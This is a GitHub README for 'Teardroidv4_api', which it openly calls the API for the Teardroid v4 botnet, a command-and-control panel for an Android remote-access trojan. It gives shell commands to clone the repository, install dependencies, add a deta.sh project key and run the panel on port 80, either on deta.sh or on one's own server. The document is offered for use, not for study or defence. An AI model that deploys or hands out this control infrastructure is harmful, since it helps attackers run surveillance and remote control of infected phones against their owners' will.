# Teardroidv4_api
Teardroid v4 Botnet API

This api is for teardroid v4 botnet

Please visit https://github.com/ScRiPt1337/Teardroid-phprat to know about teardroid and how to use it

### Deploy the Teardroid control panel

- Set up an account at [deta.sh](https://web.deta.sh/)
- Install [Deta Cli](https://docs.deta.sh/docs/cli/install)
- Logging in to Deta via the CLI
- Create a new Python Micro using the command below

```bash
$ deta new --python teardroid_control # its will create an teardroid_control folder
```

- Clone [Teardroidv4_api](https://github.com/ScRiPt1337/Teardroidv4_api) repo using the command below

```bash
$ git clone https://github.com/ScRiPt1337/Teardroidv4_api
```

- Move all Teardroidv4_api Files to teardroid_control folder using the command below

```bash
$ cd Teardroidv4_api
$ cp -r * ../teardroid_control/
```

- Deploy the Control panel using the following command.

```bash
$ deta deploy
```

### Run control panel on your own server

- Clone [Teardroidv4_api](https://github.com/ScRiPt1337/Teardroidv4_api) repo using the command below

```bash
$ git clone https://github.com/ScRiPt1337/Teardroidv4_api
```

- Install uvicorn

```bash
$ sudo apt-get install uvicorn
$ python3 -m pip install uvicorn
```

- Change dir to Teardroidv4_api

```bash
$ cd Teardroidv4_api
```

- Install all dependency

```bash
$ pip install -r requirements.txt
```

- Change project key to connect with database
- Set up an account at [deta.sh](https://web.deta.sh/) and go to project keys and create a new key and copy it
```bash
$ nano ./db/database.py
from deta import Deta
from os import getenv

deta = Deta(getenv("DETA_PROJECT_KEY")) => deta =  Deta("demo project key")
# replace getenv("DETA_PROJECT_KEY") with your deta.sh project key
# make sure your remove getenv
```

- Run teardroid api

```bash
$ screen
# press enter to go inside the screen session
$ uvicorn main:app --host 0.0.0.0 --port 80
# now close your terminal windows  and we are good to go
```

- Done
